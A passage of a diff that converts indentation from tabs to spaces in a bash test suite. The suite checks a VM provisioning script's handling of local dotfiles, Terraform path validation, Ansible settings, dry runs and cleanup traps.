-	teardown_test_env
+    teardown_test_env
 }
 
 test_install_sh_not_executable() {
-	setup_test_env
+    setup_test_env
 
-	# Test: Non-executable install.sh (should still pass, Ansible handles execution)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
-	chmod 644 "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Non-executable install.sh (should still pass, Ansible handles execution)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
+    chmod 644 "$TEST_DOTFILES_DIR/install.sh"
 
-	validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "Non-executable install.sh should pass (Ansible handles execution)" "pass" "$result"
+    validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "Non-executable install.sh should pass (Ansible handles execution)" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_install_sh_world_writable() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-005 - World-writable install.sh should be rejected (CVSS 4.0)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-005 - World-writable install.sh should be rejected (CVSS 4.0)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "test"
 EOF
-	chmod 666 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-rw-
+    chmod 666 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-rw-
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Try to use dotfiles with world-writable install.sh (should be rejected)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Try to use dotfiles with world-writable install.sh (should be rejected)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script rejects world-writable files
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -q "world-writable"; then
-		result="pass"
-	fi
+    # Verify behavior: script rejects world-writable files
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -q "world-writable"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-005: Script implements world-writable permission check" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-005: Script implements world-writable permission check" "pass" "$result"
 }
 
 test_install_sh_group_writable() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-005 - Group-writable install.sh should be rejected
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
-	chmod 664 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-r--
+    # Test: SEC-005 - Group-writable install.sh should be rejected
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
+    chmod 664 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-r--
 
-	# Simulate permission check (group-writable bit 020)
-	local perms="664"
-	local group_writable=$((8#$perms & 8#020))
+    # Simulate permission check (group-writable bit 020)
+    local perms="664"
+    local group_writable=$((8#$perms & 8#020))
 
-	if [ "$group_writable" -ne 0 ]; then
-		result="fail" # Group-writable detected (should be rejected)
-	else
-		result="pass"
-	fi
+    if [ "$group_writable" -ne 0 ]; then
+        result="fail" # Group-writable detected (should be rejected)
+    else
+        result="pass"
+    fi
 
-	test_result "SEC-005: Group-writable install.sh should be detected" "fail" "$result"
+    test_result "SEC-005: Group-writable install.sh should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 ##############################################################################
@@ -1182,183 +1182,183 @@ test_install_sh_group_writable() {
 ##############################################################################
 
 test_terraform_variable_passing() {
-	echo -e "\n${YELLOW}=== INTEGRATION TESTS: Terraform ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== INTEGRATION TESTS: Terraform ===${NC}"
+    setup_test_env
 
-	# Test: Terraform variable should be passed correctly
-	# Verify by checking that script runs successfully with TEST_MODE
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Terraform variable should be passed correctly
+    # Verify by checking that script runs successfully with TEST_MODE
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with local dotfiles (TEST_MODE prevents actual terraform run)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script with local dotfiles (TEST_MODE prevents actual terraform run)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script completes validation (would pass var to terraform)
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Using local dotfiles"; then
-		result="pass"
-	fi
+    # Verify behavior: script completes validation (would pass var to terraform)
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Using local dotfiles"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "Terraform receives dotfiles_local_path variable" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "Terraform receives dotfiles_local_path variable" "pass" "$result"
 }
 
 test_terraform_variable_empty_default() {
-	# Test: Terraform variable should default to empty string (BEHAVIOR TEST)
-	# Instead of grepping files, test actual script behavior
-	local result="fail"
-	export TEST_MODE=1
+    # Test: Terraform variable should default to empty string (BEHAVIOR TEST)
+    # Instead of grepping files, test actual script behavior
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script without --test-dotfiles (should use GitHub default)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script without --test-dotfiles (should use GitHub default)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script uses GitHub default
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script uses GitHub default
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "Terraform variable defaults to empty string (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    test_result "Terraform variable defaults to empty string (behavior test)" "pass" "$result"
 }
 
 test_terraform_validation_rejects_relative_paths() {
-	# Test: Terraform validation should reject relative paths for dotfiles_local_path
-	# This validates Issue #37: ARCH-003 implementation
-	echo -e "\n${YELLOW}=== TERRAFORM VALIDATION TESTS ===${NC}"
+    # Test: Terraform validation should reject relative paths for dotfiles_local_path
+    # This validates Issue #37: ARCH-003 implementation
+    echo -e "\n${YELLOW}=== TERRAFORM VALIDATION TESTS ===${NC}"
 
-	# Skip if terraform not available (e.g., in CI without terraform)
-	if ! command -v terraform &>/dev/null; then
-		echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available (tests require terraform command)"
-		return 0
-	fi
+    # Skip if terraform not available (e.g., in CI without terraform)
+    if ! command -v terraform &> /dev/null; then
+        echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available (tests require terraform command)"
+        return 0
+    fi
 
-	local result="fail"
-	local terraform_dir
-	terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
+    local result="fail"
+    local terraform_dir
+    terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
 
-	# Initialize terraform if needed (in subshell)
-	if [[ ! -d "$terraform_dir/.terraform" ]]; then
-		(cd "$terraform_dir" && terraform init >/dev/null 2>&1)
-	fi
+    # Initialize terraform if needed (in subshell)
+    if [[ ! -d "$terraform_dir/.terraform" ]]; then
+        (cd "$terraform_dir" && terraform init > /dev/null 2>&1)
+    fi
 
-	# Create test tfvars file with relative path (should be rejected)
-	local test_tfvars
-	test_tfvars=$(mktemp)
-	cat >"$test_tfvars" <<EOF
+    # Create test tfvars file with relative path (should be rejected)
+    local test_tfvars
+    test_tfvars=$(mktemp)
+    cat > "$test_tfvars" << EOF
 vm_name = "test-validation-vm"
 dotfiles_local_path = "relative/path/to/dotfiles"
 EOF
 
-	# Run terraform plan with invalid relative path (validate doesn't support -var-file)
-	set +e
-	output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
-	local exit_code=$?
-	set -e
+    # Run terraform plan with invalid relative path (validate doesn't support -var-file)
+    set +e
+    output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Cleanup
-	rm -f "$test_tfvars"
+    # Cleanup
+    rm -f "$test_tfvars"
 
-	# RED PHASE: Test should FAIL initially (no validation block exists yet)
-	# After adding validation block (GREEN PHASE), this test will PASS
-	# Expected: Terraform should reject relative path with validation error
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -qi "dotfiles_local_path"; then
-		result="pass"
-	fi
+    # RED PHASE: Test should FAIL initially (no validation block exists yet)
+    # After adding validation block (GREEN PHASE), this test will PASS
+    # Expected: Terraform should reject relative path with validation error
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -qi "dotfiles_local_path"; then
+        result="pass"
+    fi
 
-	test_result "Terraform validation rejects relative paths (Issue #37)" "pass" "$result"
+    test_result "Terraform validation rejects relative paths (Issue #37)" "pass" "$result"
 }
 
 test_terraform_validation_accepts_absolute_paths() {
-	# Test: Terraform validation should accept absolute paths for dotfiles_local_path
+    # Test: Terraform validation should accept absolute paths for dotfiles_local_path
 
-	# Skip if terraform not available
-	if ! command -v terraform &>/dev/null; then
-		echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available"
-		return 0
-	fi
+    # Skip if terraform not available
+    if ! command -v terraform &> /dev/null; then
+        echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available"
+        return 0
+    fi
 
-	local result="fail"
-	local terraform_dir
-	terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
+    local result="fail"
+    local terraform_dir
+    terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
 
-	if [[ ! -d "$terraform_dir/.terraform" ]]; then
-		(cd "$terraform_dir" && terraform init >/dev/null 2>&1)
-	fi
+    if [[ ! -d "$terraform_dir/.terraform" ]]; then
+        (cd "$terraform_dir" && terraform init > /dev/null 2>&1)
+    fi
 
-	# Create test tfvars file with absolute path (should be accepted)
-	local test_tfvars
-	test_tfvars=$(mktemp)
-	cat >"$test_tfvars" <<EOF
+    # Create test tfvars file with absolute path (should be accepted)
+    local test_tfvars
+    test_tfvars=$(mktemp)
+    cat > "$test_tfvars" << EOF
 vm_name = "test-validation-vm"
 dotfiles_local_path = "/absolute/path/to/dotfiles"
 EOF
 
-	# Run terraform plan with valid absolute path (validate doesn't support -var-file)
-	set +e
-	output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
-	local exit_code=$?
-	set -e
+    # Run terraform plan with valid absolute path (validate doesn't support -var-file)
+    set +e
+    output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Cleanup
-	rm -f "$test_tfvars"
+    # Cleanup
+    rm -f "$test_tfvars"
 
-	# Expected: Terraform should accept absolute path
-	if [ $exit_code -eq 0 ]; then
-		result="pass"
-	fi
+    # Expected: Terraform should accept absolute path
+    if [ $exit_code -eq 0 ]; then
+        result="pass"
+    fi
 
-	test_result "Terraform validation accepts absolute paths (Issue #37)" "pass" "$result"
+    test_result "Terraform validation accepts absolute paths (Issue #37)" "pass" "$result"
 }
 
 test_terraform_validation_accepts_empty_path() {
-	# Test: Terraform validation should accept empty string for dotfiles_local_path
+    # Test: Terraform validation should accept empty string for dotfiles_local_path
 
-	# Skip if terraform not available
-	if ! command -v terraform &>/dev/null; then
-		echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available"
-		return 0
-	fi
+    # Skip if terraform not available
+    if ! command -v terraform &> /dev/null; then
+        echo -e "${YELLOW}⊘ SKIP${NC}: Terraform not available"
+        return 0
+    fi
 
-	local result="fail"
-	local terraform_dir
-	terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
+    local result="fail"
+    local terraform_dir
+    terraform_dir=$(cd "$SCRIPT_DIR/../terraform" && pwd)
 
-	if [[ ! -d "$terraform_dir/.terraform" ]]; then
-		(cd "$terraform_dir" && terraform init >/dev/null 2>&1)
-	fi
+    if [[ ! -d "$terraform_dir/.terraform" ]]; then
+        (cd "$terraform_dir" && terraform init > /dev/null 2>&1)
+    fi
 
-	# Create test tfvars file with empty path (should be accepted)
-	local test_tfvars
-	test_tfvars=$(mktemp)
-	cat >"$test_tfvars" <<EOF
+    # Create test tfvars file with empty path (should be accepted)
+    local test_tfvars
+    test_tfvars=$(mktemp)
+    cat > "$test_tfvars" << EOF
 vm_name = "test-validation-vm"
 dotfiles_local_path = ""
 EOF
 
-	# Run terraform plan with empty path (validate doesn't support -var-file)
-	set +e
-	output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
-	local exit_code=$?
-	set -e
+    # Run terraform plan with empty path (validate doesn't support -var-file)
+    set +e
+    output=$(cd "$terraform_dir" && terraform plan -var-file="$test_tfvars" -input=false 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Cleanup
-	rm -f "$test_tfvars"
+    # Cleanup
+    rm -f "$test_tfvars"
 
-	# Expected: Terraform should accept empty string (default behavior)
-	if [ $exit_code -eq 0 ]; then
-		result="pass"
-	fi
+    # Expected: Terraform should accept empty string (default behavior)
+    if [ $exit_code -eq 0 ]; then
+        result="pass"
+    fi
 
-	test_result "Terraform validation accepts empty path (Issue #37)" "pass" "$result"
+    test_result "Terraform validation accepts empty path (Issue #37)" "pass" "$result"
 }
 
 ##############################################################################
@@ -1366,50 +1366,50 @@ EOF
 ##############################################################################
 
 test_ansible_inventory_with_local_path() {
-	echo -e "\n${YELLOW}=== INTEGRATION TESTS: Ansible Inventory ===${NC}"
+    echo -e "\n${YELLOW}=== INTEGRATION TESTS: Ansible Inventory ===${NC}"
 
-	# Test: Ansible inventory should include dotfiles_local_path when set (BEHAVIOR TEST)
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Ansible inventory should include dotfiles_local_path when set (BEHAVIOR TEST)
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with --test-dotfiles
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script with --test-dotfiles
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script uses local dotfiles
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script uses local dotfiles
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "Ansible inventory includes dotfiles_local_path when set (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "Ansible inventory includes dotfiles_local_path when set (behavior test)" "pass" "$result"
 }
 
 test_ansible_inventory_without_local_path() {
-	# Test: Ansible inventory should not include dotfiles_local_path when not set (BEHAVIOR TEST)
-	local result="fail"
-	export TEST_MODE=1
+    # Test: Ansible inventory should not include dotfiles_local_path when not set (BEHAVIOR TEST)
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script without --test-dotfiles
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script without --test-dotfiles
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script uses GitHub default
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script uses GitHub default
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "Ansible inventory excludes dotfiles_local_path when not set (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    test_result "Ansible inventory excludes dotfiles_local_path when not set (behavior test)" "pass" "$result"
 }
 
 ##############################################################################
@@ -1417,77 +1417,77 @@ test_ansible_inventory_without_local_path() {
 ##############################################################################
 
 test_ansible_playbook_uses_local_repo() {
-	echo -e "\n${YELLOW}=== INTEGRATION TESTS: Ansible Playbook ===${NC}"
+    echo -e "\n${YELLOW}=== INTEGRATION TESTS: Ansible Playbook ===${NC}"
 
-	# Test: Ansible playbook should use file:// URL when dotfiles_local_path is set (BEHAVIOR TEST)
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Ansible playbook should use file:// URL when dotfiles_local_path is set (BEHAVIOR TEST)
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with --test-dotfiles
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script with --test-dotfiles
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script uses local dotfiles
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script uses local dotfiles
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "Ansible playbook uses file:// URL for local dotfiles (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "Ansible playbook uses file:// URL for local dotfiles (behavior test)" "pass" "$result"
 }
 
 test_ansible_playbook_uses_github_default() {
-	# Test: Ansible playbook should use GitHub URL when dotfiles_local_path is not set (BEHAVIOR TEST)
-	local result="fail"
-	export TEST_MODE=1
+    # Test: Ansible playbook should use GitHub URL when dotfiles_local_path is not set (BEHAVIOR TEST)
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script without --test-dotfiles
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script without --test-dotfiles
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script uses GitHub default
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script uses GitHub default
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "Ansible playbook uses GitHub URL when no local path (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    test_result "Ansible playbook uses GitHub URL when no local path (behavior test)" "pass" "$result"
 }
 
 test_ansible_whitespace_handling() {
-	# Test: BUG-007 - Ansible template handles paths correctly (BEHAVIOR TEST)
-	# NOTE: Spaces are blocked by SEC-003 for security, so test with valid path
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: BUG-007 - Ansible template handles paths correctly (BEHAVIOR TEST)
+    # NOTE: Spaces are blocked by SEC-003 for security, so test with valid path
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with valid dotfiles path
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script with valid dotfiles path
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Verify Ansible template handles dotfiles path correctly
-	# Success means Jinja2 template correctly passes path variable
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles:.*$TEST_DOTFILES_DIR.*(local)"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Verify Ansible template handles dotfiles path correctly
+    # Success means Jinja2 template correctly passes path variable
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Dotfiles:.*$TEST_DOTFILES_DIR.*(local)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "BUG-007: Ansible template handles dotfiles path correctly (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "BUG-007: Ansible template handles dotfiles path correctly (behavior test)" "pass" "$result"
 }
 
 ##############################################################################
@@ -1495,57 +1495,57 @@ test_ansible_whitespace_handling() {
 ##############################################################################
 
 test_e2e_full_pipeline() {
-	echo -e "\n${YELLOW}=== END-TO-END TESTS ===${NC}"
+    echo -e "\n${YELLOW}=== END-TO-END TESTS ===${NC}"
 
-	# Create minimal test dotfiles
-	local test_dotfiles_dir="/tmp/test-dotfiles-$$"
-	mkdir -p "$test_dotfiles_dir"
-	cat >"$test_dotfiles_dir/install.sh" <<'EOF'
+    # Create minimal test dotfiles
+    local test_dotfiles_dir="/tmp/test-dotfiles-$$"
+    mkdir -p "$test_dotfiles_dir"
+    cat > "$test_dotfiles_dir/install.sh" << 'EOF'
 #!/bin/bash
 # Safe dotfiles installation
 echo "Installing dotfiles..."
 ln -sf ~/.dotfiles/.zshrc ~/.zshrc
 EOF
-	chmod 644 "$test_dotfiles_dir/install.sh"
+    chmod 644 "$test_dotfiles_dir/install.sh"
 
-	local result="fail"
+    local result="fail"
 
-	# Run with --dry-run flag (validates without creating VM)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-e2e-vm --test-dotfiles "$test_dotfiles_dir" --dry-run 2>&1)
-	local exit_code=$?
-	set -e
+    # Run with --dry-run flag (validates without creating VM)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-e2e-vm --test-dotfiles "$test_dotfiles_dir" --dry-run 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Validate full pipeline would work
-	if [ $exit_code -eq 0 ] &&
-		echo "$output" | grep -q "DRY RUN" &&
-		echo "$output" | grep -q "Dotfiles: $test_dotfiles_dir (local)"; then
-		result="pass"
-	fi
+    # Validate full pipeline would work
+    if [ $exit_code -eq 0 ] &&
+        echo "$output" | grep -q "DRY RUN" &&
+        echo "$output" | grep -q "Dotfiles: $test_dotfiles_dir (local)"; then
+        result="pass"
+    fi
 
-	test_result "E2E: Full pipeline validation with local dotfiles" "pass" "$result"
+    test_result "E2E: Full pipeline validation with local dotfiles" "pass" "$result"
 
-	# Cleanup
-	rm -rf "$test_dotfiles_dir"
+    # Cleanup
+    rm -rf "$test_dotfiles_dir"
 }
 
 test_e2e_dry_run_with_default_dotfiles() {
-	# Test: --dry-run works with default (no --test-dotfiles flag)
-	local result="fail"
+    # Test: --dry-run works with default (no --test-dotfiles flag)
+    local result="fail"
 
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-e2e-default --dry-run 2>&1)
-	local exit_code=$?
-	set -e
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-e2e-default --dry-run 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Should complete validation with GitHub default
-	if [ $exit_code -eq 0 ] &&
-		echo "$output" | grep -q "DRY RUN" &&
-		echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
-		result="pass"
-	fi
+    # Should complete validation with GitHub default
+    if [ $exit_code -eq 0 ] &&
+        echo "$output" | grep -q "DRY RUN" &&
+        echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+        result="pass"
+    fi
 
-	test_result "E2E: Dry-run with GitHub default dotfiles" "pass" "$result"
+    test_result "E2E: Dry-run with GitHub default dotfiles" "pass" "$result"
 }
 
 ##############################################################################
@@ -1553,82 +1553,82 @@ test_e2e_dry_run_with_default_dotfiles() {
 ##############################################################################
 
 test_bug_008_rollback_mechanism() {
-	echo -e "\n${YELLOW}=== BUG TESTS ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== BUG TESTS ===${NC}"
+    setup_test_env
 
-	# Test: BUG-008 - Rollback mechanism on failure
-	# If path validation fails, should not proceed to Terraform
-	local result="fail"
-	export TEST_MODE=1
+    # Test: BUG-008 - Rollback mechanism on failure
+    # If path validation fails, should not proceed to Terraform
+    local result="fail"
+    export TEST_MODE=1
 
-	# Try with invalid path (should fail validation before terraform)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "/nonexistent/path" 2>&1)
-	local exit_code=$?
-	set -e
+    # Try with invalid path (should fail validation before terraform)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "/nonexistent/path" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script exits early, never mentions terraform/VM creation
-	if [ $exit_code -ne 0 ] && ! echo "$output" | grep -q "DRY RUN"; then
-		result="pass"
-	fi
+    # Verify behavior: script exits early, never mentions terraform/VM creation
+    if [ $exit_code -ne 0 ] && ! echo "$output" | grep -q "DRY RUN"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "BUG-008: Script should exit on validation failure (no Terraform)" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "BUG-008: Script should exit on validation failure (no Terraform)" "pass" "$result"
 }
 
 test_sec_007_cleanup_trap_exists() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-007 - Cleanup trap mechanism (CVSS 5.0)
-	# Verify trap is registered by checking script behavior
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: SEC-007 - Cleanup trap mechanism (CVSS 5.0)
+    # Verify trap is registered by checking script behavior
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script successfully (trap should be registered but not triggered)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script successfully (trap should be registered but not triggered)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script runs without cleanup warnings (trap exists but doesn't fire)
-	if [ $exit_code -eq 0 ] && ! echo "$output" | grep -q "cleanup_on_failure"; then
-		result="pass"
-	fi
+    # Verify behavior: script runs without cleanup warnings (trap exists but doesn't fire)
+    if [ $exit_code -eq 0 ] && ! echo "$output" | grep -q "cleanup_on_failure"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-007: Script implements cleanup trap on EXIT" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-007: Script implements cleanup trap on EXIT" "pass" "$result"
 }
 
 test_sec_007_vm_created_tracking() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-007 - VM creation state tracking
-	# Verify VM_CREATED flag behavior by running in TEST_MODE
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: SEC-007 - VM creation state tracking
+    # Verify VM_CREATED flag behavior by running in TEST_MODE
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# In TEST_MODE, VM is never created, so VM_CREATED should remain false
-	set +e
